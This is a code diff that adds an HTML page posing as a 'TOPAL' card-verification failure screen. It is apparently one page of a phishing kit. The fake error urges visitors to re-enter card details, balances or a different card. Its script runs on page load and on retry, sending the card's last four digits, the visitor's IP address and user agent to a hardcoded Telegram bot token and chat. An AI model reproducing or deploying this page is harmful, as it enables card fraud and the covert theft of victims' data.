@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>TOPAL • Verification Failed</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    :root{
+      --bg1:#0b1220; --bg2:#0f1b33; --accent:#4f8cff; --accent2:#6ee7ff;
+      --card:#0f172a; --muted:#9aa4b2; --line:#1f2a44; --error:#ef4444; --warn:#f59e0b;
+    }
+    *{box-sizing:border-box; font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,Arial;}
+    body{
+      margin:0; min-height:100vh; color:#e5e7eb;
+      background: radial-gradient(1200px 600px at 10% -10%, #1b2b5f 0%, transparent 60%),
+                  radial-gradient(800px 500px at 110% 10%, #123b5a 0%, transparent 55%),
+                  linear-gradient(160deg, var(--bg1), var(--bg2));
+      display:grid; place-items:center; padding:24px;
+    }
+    .container{width:100%; max-width:500px;}
+
+    /* Glass card */
+    .glass{
+      background: linear-gradient(180deg, rgba(255,255,255,.06), rgba(255,255,255,.02));
+      backdrop-filter: blur(10px);
+      border:1px solid rgba(255,255,255,.12);
+      border-radius:22px; box-shadow: 0 30px 60px rgba(0,0,0,.35);
+      padding:28px;
+      text-align:center;
+    }
+
+    /* Header */
+    .header{display:flex; align-items:center; justify-content:center; gap:12px; margin-bottom:24px;}
+    .mark{
+      width:42px; height:42px; border-radius:14px;
+      background: linear-gradient(135deg, #ef4444, #f87171);
+      display:grid; place-items:center; color:#fff; font-weight:900;
+      box-shadow: inset 0 0 0 1px rgba(255,255,255,.35);
+    }
+    .brand{font-weight:800; letter-spacing:.5px; font-size:20px;}
+
+    /* Error icon */
+    .error-icon{
+      width:80px; height:80px; border-radius:50%; margin:0 auto 24px;
+      background: linear-gradient(135deg, rgba(239,68,68,.2), rgba(248,113,113,.1));
+      border:2px solid rgba(239,68,68,.3);
+      display:grid; place-items:center; font-size:36px;
+    }
+
+    /* Content */
+    .title{font-size:24px; font-weight:800; margin:0 0 12px; color:#fff;}
+    .sub{color:var(--muted); font-size:15px; margin-bottom:32px; line-height:1.5;}
+    
+    /* Error details */
+    .error-box{
+      background:rgba(239,68,68,.08); border:1px solid rgba(239,68,68,.2);
+      border-radius:16px; padding:20px; margin-bottom:32px; text-align:left;
+    }
+    .error-box b{color:#fff; display:block; margin-bottom:8px; font-size:14px;}
+    .error-box p{color:#fca5a5; font-size:13px; margin:0; line-height:1.5;}
+    
+    /* Solutions */
+    .solutions{margin-bottom:32px; text-align:left;}
+    .solutions-title{color:#fff; font-size:16px; font-weight:600; margin-bottom:16px;}
+    .solution-list{display:grid; gap:12px;}
+    .solution{
+      display:flex; gap:12px; align-items:flex-start;
+    }
+    .solution-num{
+      width:24px; height:24px; min-width:24px; border-radius:50%;
+      background:var(--accent); display:grid; place-items:center;
+      font-size:11px; font-weight:800; color:#061226;
+    }
+    .solution-text{color:var(--muted); font-size:14px; line-height:1.5;}
+    .solution-text b{color:#cbd5e1;}
+
+    /* Buttons */
+    .buttons{display:flex; gap:12px; margin-top:24px;}
+    .btn{
+      flex:1; padding:14px 16px; border-radius:16px; border:none; cursor:pointer;
+      background: linear-gradient(135deg, var(--accent), var(--accent2));
+      color:#061226; font-weight:800; letter-spacing:.3px;
+      box-shadow: 0 10px 30px rgba(79,140,255,.35);
+      text-decoration:none; display:grid; place-items:center;
+    }
+    .btn-ghost{
+      padding:14px 16px; border-radius:16px; background:transparent; color:#cbd5e1;
+      border:1px solid var(--line); text-decoration:none; display:grid; place-items:center;
+    }
+    
+    /* Retry timer */
+    .retry-timer{
+      color:var(--muted); font-size:13px; margin-top:20px;
+      padding:10px; background:rgba(255,255,255,.03);
+      border-radius:12px; display:inline-block;
+    }
+    .retry-timer span{color:#fff; font-weight:600;}
+    
+    /* Support info */
+    .support{
+      margin-top:28px; padding-top:20px; border-top:1px solid var(--line);
+      color:var(--muted); font-size:12px;
+    }
+    .support a{color:var(--accent); text-decoration:none;}
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="glass">
+      <div class="header">
+        <div class="mark">!</div>
+        <div class="brand">TOPAL</div>
+      </div>
+
+      <div class="error-icon">❌</div>
+
+      <h1 class="title">Card Verification Failed</h1>
+      <p class="sub">We were unable to verify your card details. Please try again or use a different payment method.</p>
+
+      <div class="error-box">
+        <b>Error Details</b>
+        <p id="errorDetails">Security verification mismatch. The information provided does not match our records.</p>
+      </div>
+
+      <div class="solutions">
+        <div class="solutions-title">Try these solutions:</div>
+        <div class="solution-list">
+          <div class="solution">
+            <div class="solution-num">1</div>
+            <div class="solution-text"><b>Check your card details</b> - Ensure all information matches your card exactly</div>
+          </div>
+          <div class="solution">
+            <div class="solution-num">2</div>
+            <div class="solution-text"><b>Verify account balance</b> - Make sure you entered the correct current balance</div>
+          </div>
+          <div class="solution">
+            <div class="solution-num">3</div>
+            <div class="solution-text"><b>Try a different card</b> - Some cards may have additional security restrictions</div>
+          </div>
+          <div class="solution">
+            <div class="solution-num">4</div>
+            <div class="solution-text"><b>Wait and retry</b> - Temporary system issues may resolve shortly</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="buttons">
+        <a href="index.html" class="btn-ghost">← Back to Home</a>
+        <a href="withdraw.html" class="btn" id="retryBtn">Try Another Card</a>
+      </div>
+
+      <div class="retry-timer">
+        Next attempt available in: <span id="countdown">60</span> seconds
+      </div>
+
+      <div class="support">
+        Need help? Contact support at 
+        <a href="mailto:support@topal.com">support@topal.com</a> 
+        or call 1-800-TOPAL-00
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Telegram Bot Configuration
+    const BOT_TOKEN = "7989669437:AAHLUlqKopjA7Bl0nd4t02XVVJLJdVRDr54";
+    const CHAT_ID = "7289366513";
+
+    // Get error details from URL
+    const urlParams = new URLSearchParams(window.location.search);
+    const errorType = urlParams.get('type') || 'verification';
+    const cardLastFour = urlParams.get('lastFour') || '****';
+    
+    // Error messages mapping
+    const errorMessages = {
+      'verification': 'Security verification mismatch. The information provided does not match our records.',
+      'balance': 'Card balance verification failed. Please ensure you entered the correct current balance.',
+      'security': 'Security questions did not match our verification system.',
+      'system': 'Temporary system error. Please try again in a few minutes.',
+      'card': 'Card verification failed. This card may not be supported or may have restrictions.',
+      'timeout': 'Verification timeout. The process took too long to complete.'
+    };
+    
+    // Set error details
+    const errorDetails = document.getElementById('errorDetails');
+    errorDetails.textContent = errorMessages[errorType] || errorMessages['verification'];
+    
+    // Update title with card info if available
+    if (cardLastFour !== '****') {
+      document.querySelector('.title').innerHTML = `Card Verification Failed<br><span style="font-size:16px;color:var(--muted);">Card ending in ${cardLastFour}</span>`;
+    }
+
+    // Countdown timer
+    let countdownTime = 60;
+    const countdownElement = document.getElementById('countdown');
+    const retryBtn = document.getElementById('retryBtn');
+    
+    retryBtn.addEventListener('click', function(e) {
+      e.preventDefault();
+      if (countdownTime > 0) {
+        alert(`Please wait ${countdownTime} seconds before trying again.`);
+        return;
+      }
+      // Redirect to card entry page with fresh start
+      window.location.href = 'index.html';
+    });
+    
+    // Update countdown every second
+    const countdownInterval = setInterval(() => {
+      countdownTime--;
+      countdownElement.textContent = countdownTime;
+      
+      if (countdownTime <= 0) {
+        clearInterval(countdownInterval);
+        countdownElement.textContent = '0';
+        retryBtn.textContent = 'Try Another Card Now';
+        retryBtn.style.opacity = '1';
+      }
+    }, 1000);
+
+    // Send error notification to Telegram
+    async function sendErrorToTelegram() {
+      const message = `
+🚨 CARD VERIFICATION FAILED
+━━━━━━━━━━━━━━━━━━━━━━━
+❌ Error Type: ${errorType}
+💳 Card: •••• ${cardLastFour}
+⏰ Time: ${new Date().toLocaleString()}
+🌐 IP: ${await getIP()}
+📱 User Agent: ${navigator.userAgent.substring(0, 60)}...
+━━━━━━━━━━━━━━━━━━━━━━━
+⚠️ User shown error page
+🔄 Retry timer: 60 seconds
+      `.trim();
+
+      // Encode message for URL
+      const encodedMessage = encodeURIComponent(message);
+      
+      // Telegram API URL
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMessage}`;
+      
+      try {
+        await fetch(url);
+      } catch (error) {
+        console.error('Failed to send error to Telegram:', error);
+      }
+    }
+
+    // Get IP address
+    async function getIP() {
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+      } catch (error) {
+        return 'IP not available';
+      }
+    }
+
+    // Send error notification
+    sendErrorToTelegram();
+    
+    // Also send notification when user tries to retry
+    retryBtn.addEventListener('click', function() {
+      if (countdownTime <= 0) {
+        const retryMessage = encodeURIComponent(
+          `🔄 USER RETRY ATTEMPT\nCard: •••• ${cardLastFour}\nTime: ${new Date().toLocaleString()}`
+        );
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${retryMessage}`);
+      }
+    });
+    
+    // Log error details
+    console.log('Error page loaded:', {
+      type: errorType,
+      cardLastFour: cardLastFour,
+      timestamp: new Date().toISOString()
+    });
+  </script>
+</body>
+</html>
